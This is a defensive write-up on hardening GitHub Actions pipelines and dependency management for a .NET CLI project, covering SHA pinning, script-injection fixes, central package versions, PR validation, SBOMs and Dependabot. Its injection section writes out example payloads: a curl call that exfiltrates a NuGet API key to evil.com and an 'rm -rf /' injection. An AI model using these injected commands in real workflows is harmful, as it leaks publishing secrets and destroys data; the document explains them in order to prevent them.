# CI/CD Pipeline Hardening and Dependency Governance for .NET Projects

## The Problem

The project started with the minimal CI/CD setup that many open-source .NET projects begin with: a couple of workflows that build and publish on push to `master`, no PR validation, mutable action tags, inline expression expansion in shell scripts, and package versions scattered across every `.csproj` file. This is the "it works on my machine and ships when I push" starting point that gets you from zero to NuGet quickly — but accumulates compounding risk with every commit.

### What was at risk

**Supply-chain compromise via mutable action tags.** The workflows used references like `actions/checkout@v4`. In GitHub Actions, `@v4` is a *git tag* — a mutable pointer. The action's maintainer (or an attacker who compromises the maintainer's account) can force-push a new commit to the same tag at any time. Every subsequent workflow run silently picks up the new code. There is no diff, no notification, no approval step.

This isn't theoretical. In March 2025, the popular `tj-actions/changed-files` action was compromised via exactly this vector ([GHSA-mcph-m25j-8g6w](https://github.com/advisories/GHSA-mcph-m25j-8g6w)). An attacker gained write access to the repository, repointed existing tags to a malicious commit, and the injected code exfiltrated CI secrets (including `GITHUB_TOKEN`, NPM tokens, and AWS keys) from every repository that referenced the action. Thousands of repositories were affected. The attack was effective precisely because tag-based references are the default convention and nobody audits what a tag points to after the initial `uses:` line is written.

The blast radius of a compromised action in this project would include:
- `NUGET_API_KEY` — ability to publish arbitrary packages under the project's name
- `GITHUB_TOKEN` — ability to push code, create releases, modify issues
- `GIST_TOKEN` — ability to modify gists (used for the coverage badge)
- Source code — the checkout step makes the entire repository available to the action

**Script injection in shell steps.** The workflows used GitHub context expressions directly inside `run:` blocks:

```yaml
run: |
  BASE="${{ github.event.inputs.base_version || env.BASE_VERSION }}"
```

When GitHub Actions evaluates a workflow, it performs *string substitution* of `${{ ... }}` expressions *before* the shell sees the script. The expression is replaced with its literal value inline. If that value contains shell metacharacters, the shell interprets them as syntax, not data.

Consider what happens if someone triggers the `workflow_dispatch` with `base_version` set to:

```
"; curl https://evil.com/exfil?token=$NUGET_API_KEY; echo "
```

After GitHub's expression substitution, the shell sees:

```bash
BASE=""; curl https://evil.com/exfil?token=$NUGET_API_KEY; echo ""
```

This executes three commands: an empty assignment, a curl that exfiltrates the NuGet API key, and an echo. The `workflow_dispatch` trigger requires repository write access, so this particular attack surface is limited to collaborators — but in organizations with many contributors, "repository write access" is not a high bar.

The same pattern appeared in the `dotnet pack` step:

```yaml
run: dotnet pack ... -p:Version=${{ steps.version.outputs.version }}
```

Here the injected value comes from a previous step's output, which is safer (since the step controls the output). But the pattern is still wrong: it teaches contributors that inline expression expansion is normal, and the next person to add a step might expand a less-controlled value using the same pattern.

**Version drift across projects.** The solution has 7 projects (3 source, 4 test). Each `.csproj` declared its own package versions:

```xml
<!-- ServiceBusToolset.Application.csproj -->
<PackageReference Include="Azure.Messaging.ServiceBus" Version="7.20.1"/>

<!-- ServiceBusToolset.CLI.csproj -->
<PackageReference Include="Azure.Messaging.ServiceBus" Version="7.20.1"/>

<!-- ServiceBusToolset.TestHarness.csproj -->
<PackageReference Include="Azure.Messaging.ServiceBus" Version="7.20.1"/>
```

Today they're all `7.20.1`. But there's no *mechanism* ensuring that. When someone upgrades the Application project's reference, they have to remember to upgrade CLI and TestHarness too. Miss one, and you get subtle behavior differences: "the unit tests pass because the test project references the same version as Application, but the CLI ships with an older version that has a different serialization behavior."

This problem compounds with transitive dependencies. If `Azure.Messaging.ServiceBus 7.20.1` depends on `Azure.Core 1.44.1`, and `Azure.Identity 1.17.1` also depends on `Azure.Core` but at a different version, NuGet resolves the conflict per-project. Two projects can end up with different transitive versions of the same package without anyone noticing.

**No quality gates.** The alpha release workflow had no test step. A push to `master` would:

1. Checkout the code
2. Build it
3. Pack it as a NuGet tool
4. Push to NuGet.org

If the tests were failing — or if someone merged a PR without running tests locally — the broken code shipped directly to NuGet. There was no gate between "compiles" and "published." For a CLI tool that operates on production Service Bus queues, shipping a broken version means an operator could corrupt or lose messages.

## What Changed

### 1. Pinned Action Versions with SHA References

Every GitHub Action reference was changed from mutable tags to immutable SHA pins:

```yaml
# Before: mutable tag — resolves to whatever commit the tag points to today
- uses: actions/checkout@v4

# After: immutable SHA pin — always resolves to the exact same commit, forever
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

#### How SHA pinning works

A git tag is a named pointer to a commit. It can be moved (force-pushed) to point to a different commit at any time. A commit SHA is a cryptographic hash — it's the *content itself*, not a pointer to content. You can't "repoint" a SHA because the SHA *is* the commit. If the action's code changes, the SHA changes.

When GitHub Actions encounters `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`, it fetches that exact commit from the action's repository. Even if every tag in the repository is deleted or repointed, the SHA reference still resolves to the same code.

The trailing `# v4.2.2` comment has no functional effect — it's purely for human readability. When reviewing a PR, you can see at a glance which version the SHA corresponds to. When Dependabot proposes an update, the PR diff clearly shows both the old and new SHA and the version comment changing.

#### What was pinned

Every action across all three workflows was pinned. The full list:

| Action | SHA | Version | Used in |
|---|---|---|---|
| `actions/checkout` | `11bd71901bbe5b1630ceea73d27597364c9af683` | v4.2.2 | All workflows |
| `actions/setup-dotnet` | `baa11fbfe1d6520db94683bd5c7a3818018e4309` | v5.1.0 | All workflows |
| `actions/cache` | `cdf6c1fa76f9f475f3d7449005a359c84ca0f306` | v5.0.3 | All workflows |
| `actions/upload-artifact` | `b7c566a772e6b6bfb58ed0dc250532a479d7789f` | v6.0.0 | PR validation |
| `actions/download-artifact` | `37930b1c2abaa49bbe596cd826c3c89aef350131` | v7.0.0 | PR validation |
| `softprops/action-gh-release` | `a06a81a03ee405af7f2048a818ed3f03bbf83c7b` | v2.5.0 | Stable release |
| `danielpalme/ReportGenerator-GitHub-Action` | `ee0ae774f6d3afedcbd1683c1ab21b83670bdf8e` | 5.5.1 | Alpha release, PR validation |
| `schneegans/dynamic-badges-action` | `e9a478b16159b4d31420099ba146cdc50f134483` | v1.7.0 | Alpha release |
| `marocchino/sticky-pull-request-comment` | `773744901bac0e8cbb5a0dc842800d45e9b2b405` | v2.9.4 | PR validation |
| `dorny/test-reporter` | `b082adf0eced0765477756c2a610396589b8c637` | v2.5.0 | PR validation |

#### Why not `@v4.2.2` (non-major tag)?

Even specific version tags like `@v4.2.2` are mutable. They're just conventions — nothing in git prevents force-pushing a non-major tag. The only immutable reference is the SHA. Some organizations use tag-protection rules or branch-protection rules on the action repository to make tag repointing harder, but these are policy controls, not cryptographic guarantees. SHA pinning is the only approach that provides actual immutability.

#### The Dependabot synergy

SHA-pinned actions create a maintenance burden: you need to update the SHA when a new version is released. Dependabot solves this by automatically creating PRs that update both the SHA and the version comment. The `dependabot.yml` configuration includes a `github-actions` ecosystem specifically for this:

```yaml
- package-ecosystem: github-actions
  directory: /
  schedule:
    interval: weekly
  open-pull-requests-limit: 5
```

This creates a virtuous cycle: SHA pinning provides security, Dependabot provides convenience, and the PR pipeline validates that the updated action doesn't break anything.

### 2. Script Injection Prevention

#### The mechanism in detail

GitHub Actions expression substitution happens *before the shell is invoked*. The workflow YAML goes through a template engine that finds `${{ ... }}` expressions and replaces them with their evaluated values. The result is then passed to the shell as a script string.

This means the substituted value becomes part of the shell script's source code, not data passed to the script. The distinction is critical:

```yaml
# Expression substitution: value becomes shell SOURCE CODE
run: echo "Hello ${{ github.event.inputs.name }}"
# If name is "world; rm -rf /", shell sees: echo "Hello world; rm -rf /"
# The ; breaks out of the echo command

# Environment variable: value becomes shell DATA
env:
  NAME: ${{ github.event.inputs.name }}
run: echo "Hello $NAME"
# If NAME is "world; rm -rf /", shell sees: echo "Hello $NAME"
# $NAME expands to the literal string "world; rm -rf /" — no command injection
```

The key difference: when the shell evaluates `$NAME`, it treats the variable's contents as a single string value, not as shell syntax. The semicolon inside `$NAME` is data, not a command separator.

#### What was fixed

Three categories of expression expansion were addressed:

**1. `workflow_dispatch` inputs (user-controlled):**

```yaml
# Before: user input directly in shell
run: |
  BASE="${{ github.event.inputs.base_version || env.BASE_VERSION }}"

# After: user input through env var + validation
env:
  INPUT_BASE_VERSION: ${{ github.event.inputs.base_version }}
run: |
  BASE="${INPUT_BASE_VERSION:-$BASE_VERSION}"
  if [[ ! "$BASE" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "::error::Invalid base version '$BASE'. Must match X.Y.Z semver format."
    exit 1
  fi
```

The `${INPUT_BASE_VERSION:-$BASE_VERSION}` bash syntax means: use `INPUT_BASE_VERSION` if set and non-empty, otherwise fall back to `BASE_VERSION`. This replaces the `${{ ... || ... }}` pattern with a pure-shell equivalent.

The regex validation (`^[0-9]+\.[0-9]+\.[0-9]+$`) provides defense in depth: even if the environment variable somehow contained shell metacharacters, the regex check would reject it before it's used. The `$` anchor ensures nothing follows the version pattern.

**2. Step outputs (controlled but pattern-setting):**

```yaml
# Before: step output expanded inline
run: dotnet pack ... -p:Version=${{ steps.version.outputs.version }}

# After: step output through env var
env:
  VERSION: ${{ steps.version.outputs.version }}
run: dotnet pack ... -p:Version=$VERSION
```

While `steps.version.outputs.version` is set by our own previous step and is safe in isolation, the pattern is wrong. A contributor copying this pattern for a different value — say `${{ github.event.pull_request.title }}` — would introduce a real injection vulnerability. By consistently using `env:` for all values, the safe pattern is the only pattern in the codebase.

**3. Repository metadata:**

```yaml
# Before: repository context expanded inline
run: |
  sbom-tool generate ... -nsb "https://github.com/${{ github.repository }}"

# After: through env var
env:
  REPO: ${{ github.repository }}
run: |
  sbom-tool generate ... -nsb "https://github.com/$REPO"
```

`github.repository` is GitHub-controlled and safe, but the same reasoning applies: consistent patterns prevent inconsistent mistakes.

### 3. Central Package Management (CPM)

#### How it works under the hood

NuGet's Central Package Management is an MSBuild feature that splits package references into two parts:

1. **What** a project uses — declared with `<PackageReference>` in each `.csproj` (no `Version` attribute)
2. **Which version** of each package — declared with `<PackageVersion>` in `Directory.Packages.props`

When MSBuild evaluates a project, it walks up the directory tree looking for `Directory.Packages.props`. When found, it reads the `ManagePackageVersionsCentrally` property. If true, any `<PackageReference>` without a `Version` attribute is resolved against the `<PackageVersion>` entries. If a package is referenced but has no corresponding `<PackageVersion>`, the build *fails with an error* — not a warning, a hard error. This is the enforcement mechanism: it's structurally impossible to reference a package at an ad-hoc version.

#### The migration

Seven `.csproj` files were modified. Each file's changes followed the same pattern:

```xml
<!-- Before: each .csproj owns its versions -->
<PackageReference Include="Azure.Messaging.ServiceBus" Version="7.20.1"/>
<PackageReference Include="Azure.Identity" Version="1.17.1"/>
<PackageReference Include="CommandLineParser" Version="2.9.1"/>

<!-- After: .csproj declares intent, not version -->
<PackageReference Include="Azure.Messaging.ServiceBus"/>
<PackageReference Include="Azure.Identity"/>
<PackageReference Include="CommandLineParser"/>
```

The new `Directory.Packages.props` at the repository root contains all 27 package versions:

```xml
<Project>
  <PropertyGroup>
    <ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally>
    <CentralPackageTransitivePinningEnabled>false</CentralPackageTransitivePinningEnabled>
  </PropertyGroup>
  <ItemGroup>
    <PackageVersion Include="Ardalis.Result" Version="10.1.0" />
    <PackageVersion Include="Azure.Identity" Version="1.17.1" />
    <PackageVersion Include="Azure.Messaging.ServiceBus" Version="7.20.1" />
    <PackageVersion Include="Azure.Monitor.Query" Version="1.7.1" />
    <PackageVersion Include="CommandLineParser" Version="2.9.1" />
    <PackageVersion Include="coverlet.collector" Version="8.0.0" />
    <PackageVersion Include="DynamicData" Version="9.4.1" />
    <PackageVersion Include="Mediator.Abstractions" Version="3.0.1" />
    <PackageVersion Include="Mediator.SourceGenerator" Version="3.0.1" />
    <!-- ... 18 more entries -->
  </ItemGroup>
</Project>
```

#### Why `CentralPackageTransitivePinningEnabled` is `false`

CPM offers a `CentralPackageTransitivePinningEnabled` option that forces *transitive* dependencies to also match versions declared in `Directory.Packages.props`. This sounds appealing — pin everything! — but it creates a maintenance burden: every time you update a direct dependency, you also need to update all the transitive versions it pulls in, or the build breaks. For a project of this size, the complexity isn't justified. The direct pinning alone eliminates the version-drift-across-projects problem.

#### `Directory.Build.props` for shared build properties

A separate `Directory.Build.props` was introduced to centralize properties that were duplicated in every `.csproj`:

```xml
<Project>
  <PropertyGroup>
    <TargetFramework>net10.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <Deterministic>true</Deterministic>
    <ContinuousIntegrationBuild Condition="'$(CI)' == 'true'">true</ContinuousIntegrationBuild>
  </PropertyGroup>
</Project>
```

MSBuild imports `Directory.Build.props` *before* the project file, so properties defined here act as defaults for all projects in the directory tree. Individual projects can still override if needed (none do currently).

This removed 3 lines (`TargetFramework`, `ImplicitUsings`, `Nullable`) from each of the 7 `.csproj` files — 21 lines of duplication eliminated, plus the guarantee that you can't accidentally create a project targeting a different framework.

### 4. PR Validation Pipeline

This is the largest new file in the changeset: `pr-validation.yml` at 192 lines. It creates a multi-stage quality gate that every PR must pass before merging.

#### Workflow triggers and filtering

```yaml
on:
  pull_request:
    branches: [master]
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.coderabbit.yaml'
```

The `paths-ignore` filter skips CI for documentation-only changes. Without this, editing a README would trigger a full build + test cycle — wasting 5-10 minutes of compute for a change that can't break anything. The filter covers all Markdown files (`**.md`), the `docs/` directory, and the CodeRabbit configuration file.

#### Concurrency control

```yaml
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

Without concurrency control, pushing 3 quick commits to a PR creates 3 parallel workflow runs. The first two become waste — they validate commits that are already superseded. With `cancel-in-progress: true`, each new push cancels the previous run. The concurrency group is keyed on the PR number, so different PRs don't cancel each other.

This has meaningful cost implications for projects with active contributors. Each workflow run consumes GitHub Actions minutes. Canceling superseded runs saves roughly 2x minutes on rapid-push PRs.

#### Least-privilege permissions

```yaml
permissions:
  contents: read
  pull-requests: write
  checks: write
```

This is a *workflow-level* declaration that overrides GitHub's default token permissions. The defaults depend on the repository's settings but typically include `contents: write` — meaning any step in the workflow could push code, create tags, or delete branches if an action were compromised.

By explicitly setting `contents: read`, even a compromised action can only *read* the repository, not modify it. `pull-requests: write` is needed for the coverage comment. `checks: write` is needed for the test reporter to create check runs.

The alpha release workflow uses the most restrictive setting:

```yaml
permissions:
  contents: read
```

It needs no write permissions at all — the NuGet push uses `NUGET_API_KEY` directly, not the `GITHUB_TOKEN`.

#### Job 1: Unit Tests

This job runs 7 steps covering build, style, security, and testing:

**Step 1-3: Checkout, SDK setup, and cache.** Standard .NET CI boilerplate, but with SHA-pinned actions and an optimized cache key:

```yaml
- name: Cache NuGet packages
  uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
  with:
    path: ~/.nuget/packages
    key: nuget-${{ hashFiles('**/*.csproj', '**/Directory.Packages.props') }}
    restore-keys: nuget-
```

The cache key hashes *both* `.csproj` files (which declare package references) and `Directory.Packages.props` (which declares versions). If you add a new package reference in a `.csproj`, or change a version in `Directory.Packages.props`, the cache key changes and NuGet does a fresh restore. The `restore-keys: nuget-` fallback allows partial cache hits: if only one package changed, the cache from the previous run still contains all the *other* packages, so NuGet only downloads the diff.

Without caching, `dotnet restore` for this project downloads ~180 MB of packages. With a warm cache, it downloads zero — saving 15-30 seconds per run.

**Step 4: Build.**

```yaml
- name: Build
  run: dotnet build -c Release --no-restore
```

The `--no-restore` flag is important: it prevents an implicit restore during build that would bypass the cache step's timing. If build did its own restore, the cache step's duration (and miss/hit status) wouldn't reflect the actual restore cost.

**Step 5: Code formatting check.**

```yaml
- name: Check formatting
  run: dotnet format --verify-no-changes --verbosity diagnostic
```

`dotnet format` applies the rules from `.editorconfig` and checks if any file would change. `--verify-no-changes` makes it a read-only check that exits non-zero if formatting differs. This is a *gate*, not an auto-fixer: the developer must run `dotnet format` locally and commit the changes.

This is why the diff includes dozens of `.cs` files with only whitespace changes (adding a space after `:` in named arguments like `cancellationToken: cancellationToken`). When the formatting gate was first enabled, it surfaced every pre-existing style inconsistency. These were fixed in a dedicated "Formatting fixes" commit rather than mixed into unrelated changes.

The `--verbosity diagnostic` flag makes failures actionable: instead of just "formatting differs," it shows exactly which files and which rules are violated.

**Step 6: Vulnerability scanning.**

```yaml
- name: Check for vulnerable packages
  run: |
    dotnet list package --vulnerable --include-transitive 2>&1 | tee vulnerable.txt
    if grep -q "has the following vulnerable packages" vulnerable.txt; then
      echo "::error::Vulnerable NuGet packages detected"
      exit 1
    fi
```

`dotnet list package --vulnerable` queries the NuGet vulnerability database and reports any packages with known CVEs. The `--include-transitive` flag is critical: it checks not just direct references but the entire transitive closure. A vulnerability in a package three layers deep is just as exploitable as one in a direct reference.

The output is captured with `tee` (writing to both stdout and the file) so that the workflow log shows the full vulnerability report while the `grep` check reads from the file. Without `tee`, piping directly to `grep` would hide the details on success.

The `2>&1` redirect captures stderr because `dotnet list package` writes some output to stderr. Without it, warnings about unresolvable packages would bypass the `tee` and not appear in the log.

**Step 7: Unit tests with coverage.**

```yaml
- name: Run unit tests
  run: >
    dotnet test tests/ServiceBusToolset.Application.Tests
    -c Release --no-build
    --logger "trx;LogFileName=unit-tests.trx"
    --results-directory ./test-results
    --collect:"XPlat Code Coverage"
    -- DataCollectionRunSettings.DataCollectors.DataCollector.Configuration.Format=cobertura
```

Several design choices here:

- **Explicit test project path** (`tests/ServiceBusToolset.Application.Tests`) instead of `dotnet test` (which discovers all test projects). The unit test job only runs unit tests. Integration tests run in a separate job that has Docker available.
- **`--no-build`** — the build already happened in step 4. Rebuilding would waste time and potentially mask issues (if the build step passed but tests trigger a rebuild with different settings).
- **TRX logger** — produces a Visual Studio Test Results file that `dorny/test-reporter` can parse into a rich PR check with individual test results.
- **`--results-directory ./test-results`** — deterministic output location for artifact upload.
- **Cobertura coverage** — `coverlet.collector` instruments the test assemblies and produces Cobertura XML. The `-- DataCollectionRunSettings...` syntax passes configuration to the data collector through dotnet test's `--` separator (everything after `--` goes to the test runner, not to dotnet).

#### Coverage reporting in detail

The coverage flow has three stages: generation, PR comment, and threshold enforcement.

**Generation:**

```yaml
- name: Generate coverage report
  uses: danielpalme/ReportGenerator-GitHub-Action@ee0ae774f6d3afedcbd1683c1ab21b83670bdf8e # 5.5.1
  with:
    reports: ./test-results/**/coverage.cobertura.xml
    targetdir: ./coverage-report
    reporttypes: MarkdownSummaryGithub;TextSummary
```

ReportGenerator converts Cobertura XML into human-readable formats. `MarkdownSummaryGithub` produces a markdown table optimized for GitHub rendering. `TextSummary` produces a plain-text summary that's easy to parse in the threshold step.

**PR comment:**

```yaml
- name: Post coverage summary to PR
  uses: marocchino/sticky-pull-request-comment@773744901bac0e8cbb5a0dc842800d45e9b2b405 # v2.9.4
  continue-on-error: true
  with:
    header: coverage
    path: ./coverage-report/SummaryGithub.md
```

`sticky-pull-request-comment` creates a comment on the PR with the coverage report. The `header: coverage` parameter makes it a "sticky" comment — instead of creating a new comment on every push, it updates the existing one. This prevents PR comment spam: a PR with 10 pushes gets 1 coverage comment, not 10.

`continue-on-error: true` prevents a comment failure (permissions, rate limits, deleted PR) from failing the entire workflow. Coverage comments are informational, not gating.

**Threshold enforcement:**

```yaml
- name: Check coverage threshold
  if: always() && steps.generate-coverage-report.outcome == 'success'
  run: |
    SUMMARY=$(cat ./coverage-report/Summary.txt)
    LINE_COVERAGE=$(echo "$SUMMARY" | grep -i 'Line coverage' | grep -oP '[\d.]+(?=%)' || true)
    THRESHOLD=60
    if (( $(echo "$LINE_COVERAGE < $THRESHOLD" | bc -l) )); then
      echo "::error::Line coverage ${LINE_COVERAGE}% is below the ${THRESHOLD}% threshold"
      exit 1
    fi
```

The threshold is set to 60% — deliberately low. This is a floor, not a target. The purpose is to catch regressions where someone adds a large feature with zero tests, not to enforce a specific coverage number. As Martin Fowler [notes](https://martinfowler.com/bliki/TestCoverage.html): "I would say you are doing enough [testing] if the following is true: You rarely get bugs that escape into production, and you are rarely hesitant to change some code for fear it will cause production bugs." A high coverage target (e.g., 90%) incentivizes writing low-value tests to game the metric.

The `if: always() && steps.generate-coverage-report.outcome == 'success'` condition ensures this step runs even if a previous step failed (the `always()` part) but only if the coverage report was actually generated (the `outcome == 'success'` part). Without `always()`, a test failure would skip the coverage check, and you'd never know the coverage number for a failing PR.

The `|| true` after the `grep` prevents the step from failing if the coverage line isn't found (which would happen with an unexpected report format). Instead, the subsequent `if [ -z "$LINE_COVERAGE" ]` check catches this and produces a clear error.

#### Job 2: Integration Tests

```yaml
integration-tests:
  name: Integration Tests (Docker)
  runs-on: ubuntu-latest
  needs: unit-tests
  timeout-minutes: 10
```

**`needs: unit-tests`** — this creates a sequential dependency. Integration tests only run after unit tests pass. The reasoning is economic:

1. Unit tests take ~30 seconds and catch most issues (logic errors, type mismatches, contract violations)
2. Integration tests take ~3-5 minutes because they start a Docker container with the Azure Service Bus emulator
3. If unit tests fail, running integration tests is pure waste — the code is already known-broken

By sequencing them, a PR with a compile error or failing unit test gets fast feedback (~1 minute) instead of waiting for the full integration suite to time out.

**`timeout-minutes: 10`** — prevents runaway Docker containers from consuming unlimited minutes. The Service Bus emulator occasionally hangs during startup; without a timeout, the job would run for the default 6 hours.

The job runs two test suites:

```yaml
- name: Run integration tests
  run: >
    dotnet test tests/ServiceBusToolset.Integration.Tests
    -c Release --no-build

- name: Run CLI integration tests
  run: >
    dotnet test tests/ServiceBusToolset.CLI.Integration.Tests
    -c Release --no-build
```

`ServiceBusToolset.Integration.Tests` tests the Application layer against a real Service Bus instance (via Testcontainers). `ServiceBusToolset.CLI.Integration.Tests` tests the full CLI command flow end-to-end.

#### Job 3: Test Report

```yaml
test-report:
  name: Publish Test Report
  runs-on: ubuntu-latest
  needs: [unit-tests, integration-tests]
  if: always()
```

This job runs `always()` — even if unit or integration tests failed. The purpose is to publish a human-readable test report regardless of outcome. When tests fail, the report shows *which* tests failed and their error messages, directly in the PR checks tab.

The job downloads TRX artifacts from both test jobs and feeds them to `dorny/test-reporter`:

```yaml
- name: Publish test report
  uses: dorny/test-reporter@b082adf0eced0765477756c2a610396589b8c637 # v2.5.0
  with:
    name: Test Results
    path: ./test-results/**/*.trx
    reporter: dotnet-trx
```

`dorny/test-reporter` parses the TRX files and creates a GitHub Check Run with individual test results. Each test appears as a line item with pass/fail status, duration, and (on failure) the error message and stack trace. This is significantly more useful than scrolling through raw `dotnet test` console output in the workflow log.

The integration test artifact download uses `continue-on-error: true`:

```yaml
- name: Download integration test results
  uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
  with:
    name: integration-test-results
    path: ./test-results
  continue-on-error: true
```

If the integration test job was skipped (because unit tests failed), there's no artifact to download. Without `continue-on-error`, this would fail the report job, and you'd lose the unit test report too.

### 5. Test Gates on Release Workflows

Both release workflows now have a `test` job that blocks the release job:

```yaml
# Alpha release — runs on push to master
jobs:
  test:
    name: Run Unit Tests
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      # ... build, restore, test (unit only for speed)

  alpha-release:
    runs-on: ubuntu-latest
    needs: test       # ← blocks until tests pass
    steps:
      # ... pack, push to NuGet
```

```yaml
# Stable release — runs on tag push (v*)
jobs:
  test:
    name: Run All Tests
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      # ... build, restore, unit tests, integration tests, CLI integration tests

  stable-release:
    runs-on: ubuntu-latest
    needs: test       # ← blocks until ALL tests pass
    timeout-minutes: 30
    steps:
      # ... pack, SBOM, push to NuGet, GitHub Release
```

The alpha release runs only unit tests (for speed — alphas ship on every push to master). The stable release runs *all* tests, including integration and CLI integration tests, because a tagged release goes to NuGet as a stable version and should have the highest confidence level.

The alpha release also includes a coverage badge update:

```yaml
- name: Extract and publish coverage badge
  env:
    GIST_TOKEN: ${{ secrets.GIST_TOKEN }}
  run: |
    SUMMARY=$(cat ./coverage-report/Summary.txt)
    LINE_COVERAGE=$(echo "$SUMMARY" | grep -i 'Line coverage' | grep -oP '[\d.]+(?=%)')
    if [ -z "$LINE_COVERAGE" ]; then
      echo "::warning::Could not parse line coverage"
      exit 0
    fi
    # Determine badge color
    if (( $(echo "$LINE_COVERAGE >= 80" | bc -l) )); then
      COLOR="brightgreen"
    elif (( $(echo "$LINE_COVERAGE >= 60" | bc -l) )); then
      COLOR="yellowgreen"
    else
      COLOR="red"
    fi

- name: Update coverage badge gist
  if: steps.coverage.outputs.coverage != '' && env.GIST_TOKEN != ''
  uses: schneegans/dynamic-badges-action@e9a478b16159b4d31420099ba146cdc50f134483 # v1.7.0
  with:
    auth: ${{ secrets.GIST_TOKEN }}
    gistID: ${{ vars.COVERAGE_GIST_ID }}
    filename: coverage-badge.json
    label: coverage
    message: ${{ steps.coverage.outputs.coverage }}%
    color: ${{ steps.coverage.outputs.color }}
```

This uses the [shields.io endpoint badge](https://shields.io/badges/endpoint-badge) pattern: a JSON file is stored in a GitHub Gist, and the README badge points to shields.io with the Gist URL. When coverage changes, the workflow updates the Gist, and the badge reflects the new value. The dual-guard condition (`coverage != '' && GIST_TOKEN != ''`) prevents the step from failing if either the coverage couldn't be parsed or the Gist token isn't configured (e.g., in forks).

### 6. SBOM Generation

The stable release workflow generates a Software Bill of Materials (SBOM) using Microsoft's `sbom-tool`:

```yaml
- name: Generate SBOM
  env:
    VERSION: ${{ steps.version.outputs.version }}
    REPO: ${{ github.repository }}
  run: |
    dotnet tool install --global Microsoft.Sbom.DotNetTool
    sbom-tool generate \
      -b ./artifacts \
      -bc src/ServiceBusToolset.CLI \
      -pn ServiceBusToolset \
      -pv "$VERSION" \
      -ps "ServiceBusToolset" \
      -nsb "https://github.com/$REPO"
```

#### What an SBOM contains

The generated SPDX 2.2 document is a machine-readable inventory of every component in the package:

- **Direct dependencies**: `Azure.Messaging.ServiceBus 7.20.1`, `Spectre.Console 0.54.0`, etc.
- **Transitive dependencies**: everything pulled in by direct dependencies, recursively
- **License information**: for each component
- **Package URLs (purls)**: standardized identifiers that downstream vulnerability scanners can match against CVE databases
- **Relationship graph**: which package depends on which

#### Why generate an SBOM

For a CLI tool that handles production message queues, downstream consumers (enterprise IT teams, compliance auditors) may need to answer questions like:

- "Does this tool use any package with a known CVE?"
- "Does this tool include any GPL-licensed code?" (relevant for proprietary environments)
- "What version of Azure.Core is embedded? We need to patch CVE-XXXX-YYYY."

Without an SBOM, answering these questions requires decompiling the package or trusting the maintainer's dependency list. With an SBOM, the answers are machine-readable and verifiable.

The SPDX files are uploaded alongside the NuGet package in the GitHub Release:

```yaml
- name: Upload package to GitHub Release
  uses: softprops/action-gh-release@a06a81a03ee405af7f2048a818ed3f03bbf83c7b # v2.5.0
  with:
    files: |
      ./artifacts/*.nupkg
      ./artifacts/*.snupkg
      ./artifacts/_manifest/spdx_2.2/**
```

SBOM generation is increasingly a regulatory requirement. The US [Executive Order 14028](https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/) (May 2021) requires SBOMs for software sold to the federal government. The [NTIA minimum elements](https://www.ntia.gov/page/software-bill-materials) define what must be included. While this project isn't subject to those regulations, adopting the practice early means the infrastructure is ready if it ever becomes relevant.

### 7. Dependabot Configuration

```yaml
version: 2
updates:
  - package-ecosystem: nuget
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 5
```

Two ecosystems are configured:

**NuGet packages** — Dependabot scans `Directory.Packages.props` (CPM is supported) and creates PRs for outdated packages. The limit of 10 open PRs prevents a flood of update PRs that would overwhelm the maintainer. Weekly cadence balances freshness with noise.

**GitHub Actions** — Dependabot scans all workflow files for action references and creates PRs for newer versions. Since actions are SHA-pinned, Dependabot updates both the SHA and the version comment. The limit of 5 is lower because action updates are less frequent and less likely to require careful review.

The combination of CPM + Dependabot creates a closed-loop dependency management process:

```
Developer adds package → CPM pins version → Dependabot detects newer version
     → creates PR → PR pipeline validates → developer reviews and merges
     → vulnerability scan catches any remaining issues
```

### 8. CodeRabbit Configuration

```yaml
language: en-US

reviews:
  profile: chill
  request_changes_workflow: false
  auto_review:
    enabled: true
    drafts: false
  path_filters:
    - '!**/*.Designer.cs'
    - '!**/*.g.cs'
    - '!**/obj/**'
    - '!**/bin/**'
    - '!**/*.diff'
```

#### Path-specific review instructions

The key feature is `path_instructions` — each path gets contextual instructions that inform the AI reviewer about architectural intent:

```yaml
path_instructions:
  - path: src/ServiceBusToolset.Application/**
    instructions: >
      This is the Application layer using Vertical Slice Architecture.
      Each feature is a self-contained slice with Command, CommandHandler, and Result types.
      Uses martinothanar/Mediator (source-generated) for CQRS and Ardalis.Result for return types.
      Cross-cutting concerns live in Common/ folders at the appropriate level.

  - path: src/ServiceBusToolset.CLI/**
    instructions: >
      This is the CLI presentation layer. It must not contain business logic.
      CLI handlers inject ISender (Mediator) to dispatch commands to the Application layer.
      Uses CommandLineParser for argument parsing and Spectre.Console for output.

  - path: tests/**
    instructions: >
      Test classes follow [ClassName]Should naming. Test methods follow [Action]_When[Condition] naming.
      Use Shouldly for assertions and NSubstitute for mocking. Never use #region/#endregion.

  - path: .github/workflows/**
    instructions: >
      Review for security best practices: pin action versions, avoid script injection
      via untrusted inputs, ensure secrets are not logged.
```

Without these instructions, an AI reviewer sees code in isolation and produces generic feedback ("consider adding null checks"). With architectural context, it can produce feedback that respects the project's patterns ("this business logic belongs in the Application layer, not the CLI layer").

#### Path filters

Generated files (`*.Designer.cs`, `*.g.cs`) and build outputs (`obj/`, `bin/`) are excluded. Reviewing auto-generated code wastes reviewer time and produces false positives (generated code often violates style rules by design).

#### Linting tools

```yaml
tools:
  actionlint:
    enabled: true
  markdownlint:
    enabled: true
  yamllint:
    enabled: true
```

`actionlint` specifically validates GitHub Actions workflow syntax — catching issues like invalid `uses:` references, undefined outputs, and incorrect `needs:` graphs that YAML linting alone wouldn't catch.

### 9. Automated Changelog

